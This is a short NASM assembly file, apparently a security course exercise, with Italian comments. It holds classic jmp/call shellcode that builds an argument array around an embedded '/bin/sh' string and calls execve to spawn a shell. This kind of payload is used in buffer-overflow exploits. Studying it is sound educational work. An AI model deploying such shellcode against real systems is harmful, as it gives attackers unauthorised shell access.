; nasm -f elf32 task2.s -o task2.o
; ld --omagic -m elf_i386 task2.o -o task2
; task2

section .text
  global _start
    _start:
		BITS 32
		jmp short two
    one:
		pop ebx
		xor eax, eax
		mov [ebx+7], al 	; eax 4 zeri, al 1 zero
		mov [ebx+8], ebx 	; al posto delle 4 AAAA viene inserito il l'indirizzo (EBX -> "/bin/sh0AAAABBBB")
		mov [ebx+12], eax 	; EBX -> "/bin/sh0****0000" (**** ptr all'indirizzo della stringa /bin... blah blah blah)
		lea ecx, [ebx+8]	; ECX -> "/bin/sh"
		xor edx, edx
		mov al,  0x0b
		int 0x80
     two:
		call one
		db '/bin/sh*AAAABBBB' 
